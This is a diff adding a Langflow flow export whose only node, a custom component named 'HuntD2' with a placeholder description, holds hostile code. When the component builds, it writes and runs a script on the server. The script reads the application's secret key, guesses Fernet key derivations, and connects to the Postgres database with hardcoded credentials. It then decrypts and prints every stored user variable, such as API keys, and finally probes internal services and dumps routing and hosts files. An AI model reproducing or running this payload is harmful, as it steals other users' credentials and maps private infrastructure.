@@ -1,0 +1,132 @@
+{
+  "id": "545f1b7e-bde8-4c94-ad83-584e5a69b051",
+  "data": {
+    "edges": [],
+    "nodes": [
+      {
+        "id": "HD2-031c6b",
+        "data": {
+          "id": "HD2-031c6b",
+          "node": {
+            "beta": false,
+            "icon": "code",
+            "edited": false,
+            "frozen": false,
+            "legacy": false,
+            "pinned": false,
+            "outputs": [
+              {
+                "name": "output",
+                "cache": true,
+                "types": [
+                  "Message"
+                ],
+                "value": "__UNDEFINED__",
+                "hidden": null,
+                "method": "build_out",
+                "options": null,
+                "selected": "Message",
+                "tool_mode": true,
+                "loop_types": null,
+                "allows_loop": false,
+                "display_name": "Output",
+                "group_outputs": false,
+                "required_inputs": null
+              }
+            ],
+            "metadata": {
+              "module": "custom_components.huntd2",
+              "code_hash": "9b5a2611011d",
+              "dependencies": {
+                "dependencies": [
+                  {
+                    "name": "langflow",
+                    "version": "0.7.3"
+                  }
+                ],
+                "total_dependencies": 1
+              }
+            },
+            "template": {
+              "code": {
+                "info": "",
+                "list": false,
+                "name": "code",
+                "show": true,
+                "type": "code",
+                "value": "\nfrom langflow.custom import Component\nfrom langflow.io import Output, MessageTextInput\nfrom langflow.schema.message import Message\nimport subprocess\nclass HuntD2(Component):\n    display_name=\"HuntD2\"\n    description=\"d\"\n    icon=\"code\"\n    name=\"HuntD2\"\n    inputs=[MessageTextInput(name=\"input_value\", display_name=\"Input\", value=\"x\")]\n    outputs=[Output(name=\"output\", display_name=\"Output\", method=\"build_out\")]\n    def build_out(self) -> Message:\n        open(\"/tmp/hd2.py\",\"w\").write('\\nimport os, subprocess, socket, urllib.request, ssl, base64, hashlib\\nprint(\"FIND_CODE\")\\nprint(subprocess.getoutput(\"find /app -name \\'*.py\\' 2>/dev/null | xargs grep -l \\'Fernet\\\\\\\\|encrypt_api_key\\\\\\\\|def encrypt\\\\\\\\|SECRET_KEY\\' 2>/dev/null | head -30\"))\\nprint(\"GREP\")\\nprint(subprocess.getoutput(\"grep -Rn \\'Fernet\\\\\\\\|encrypt_api_key\\\\\\\\|decrypt_api_key\\\\\\\\|get_fernet\\\\\\\\|SECRET_KEY\\' /app/src /app/langflow 2>/dev/null | head -60\"))\\n# try import langflow crypto helpers\\nfor path in [\\n \"langflow.services.auth.utils\",\\n \"langflow.services.database.models.variable.model\",\\n \"langflow.services.variable.service\",\\n \"langflow.services.auth.service\",\\n \"langflow.utils.util\",\\n]:\\n    try:\\n        m=__import__(path, fromlist=[\\'*\\'])\\n        print(\"IMP\", path, [x for x in dir(m) if \\'crypt\\' in x.lower() or \\'fernet\\' in x.lower() or \\'secret\\' in x.lower() or \\'encrypt\\' in x.lower() or \\'decrypt\\' in x.lower()])\\n    except Exception as e:\\n        print(\"IMPFAIL\", path, e)\\n\\nsecret=open(\"/app/langflow/secret_key\").read().strip()\\nprint(\"SECRET\", secret)\\nfrom cryptography.fernet import Fernet\\n# try langflow style: base64 urlsafe of secret padded/truncated to 32\\nimport hashlib\\ncands=[]\\n# 1 sha256\\ncands.append((\"sha256\", base64.urlsafe_b64encode(hashlib.sha256(secret.encode()).digest())))\\n# 2 md5 double?\\ncands.append((\"md5pad\", base64.urlsafe_b64encode(hashlib.md5(secret.encode()).digest()*2)))\\n# 3 first 32 bytes of secret padded\\nraw=secret.encode()\\nif len(raw)<32: raw=raw.ljust(32,b\\'0\\')\\nelse: raw=raw[:32]\\ncands.append((\"pad32\", base64.urlsafe_b64encode(raw)))\\n# 4 passlib style\\ntry:\\n    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC\\n    from cryptography.hazmat.primitives import hashes\\n    kdf=PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=b\"langflow\", iterations=100000)\\n    cands.append((\"pbkdf\", base64.urlsafe_b64encode(kdf.derive(secret.encode()))))\\nexcept Exception as e:\\n    print(\"pbkdf err\", e)\\n\\nimport psycopg2\\nconn=psycopg2.connect(\"postgresql://myuser:mypassword@postgres:5432/langflow\")\\ncur=conn.cursor()\\ncur.execute(\"select name,value,type,user_id::text from variable\")\\nrows=cur.fetchall()\\nok=0\\nfor name,value,typ,uid in rows:\\n    if not value: continue\\n    for tag,key in cands:\\n        try:\\n            dec=Fernet(key).decrypt(value.encode()).decode()\\n            print(\"OK\", tag, name, uid[:8], \"=>\", dec)\\n            ok+=1\\n            break\\n        except Exception:\\n            pass\\nprint(\"DECRYPTED\", ok, \"of\", len(rows))\\n# ollama models full\\nctx=ssl._create_unverified_context()\\nfor u in [\"http://ollama:11434/api/tags\",\"https://ollama.aitgpt.dev.brain.cs.ait.ac.th/api/tags\"]:\\n    try:\\n        r=urllib.request.urlopen(u,context=ctx,timeout=6); print(\"OLLAMA\", u, r.read(800).decode())\\n    except Exception as e:\\n        print(\"OLLAMA\", u, e)\\n# adminer via internal\\ntry:\\n    r=urllib.request.urlopen(\"http://adminer/\", timeout=5); print(\"ADMINER\", r.status, r.read(200))\\nexcept Exception as e:\\n    print(\"ADMINER\", e)\\nprint(\"IP_ROUTE\", subprocess.getoutput(\"ip route | head; cat /etc/hosts\"))\\n')\n        return Message(text=subprocess.getoutput(\"python /tmp/hd2.py\"))\n",
+                "dynamic": true,
+                "advanced": true,
+                "password": false,
+                "required": true,
+                "fileTypes": [],
+                "file_path": "",
+                "multiline": true,
+                "title_case": false,
+                "placeholder": "",
+                "load_from_db": false
+              },
+              "_type": "Component",
+              "input_value": {
+                "info": "",
+                "list": false,
+                "name": "input_value",
+                "show": true,
+                "type": "str",
+                "value": "x",
+                "dynamic": false,
+                "advanced": false,
+                "required": false,
+                "tool_mode": false,
+                "title_case": false,
+                "_input_type": "MessageTextInput",
+                "input_types": [
+                  "Message"
+                ],
+                "placeholder": "",
+                "display_name": "Input",
+                "load_from_db": false,
+                "override_skip": false,
+                "list_add_label": "Add More",
+                "trace_as_input": true,
+                "trace_as_metadata": true,
+                "track_in_telemetry": false
+              }
+            },
+            "minimized": false,
+            "tool_mode": false,
+            "description": "d",
+            "field_order": [
+              "input_value"
+            ],
+            "base_classes": [
+              "Message"
+            ],
+            "display_name": "HuntD2",
+            "output_types": [],
+            "custom_fields": {},
+            "documentation": "",
+            "conditional_paths": []
+          },
+          "type": "HuntD2",
+          "description": "d",
+          "display_name": "HuntD2"
+        },
+        "type": "genericNode",
+        "position": {
+          "x": 1,
+          "y": 1
+        }
+      }
+    ],
+    "viewport": {
+      "x": 0,
+      "y": 0,
+      "zoom": 1
+    }
+  },
+  "name": "hd2 (1)",
+  "updated_at": "2026-08-20 06:00:21.380176",
+  "is_component": false,
+  "endpoint_name": null
+}
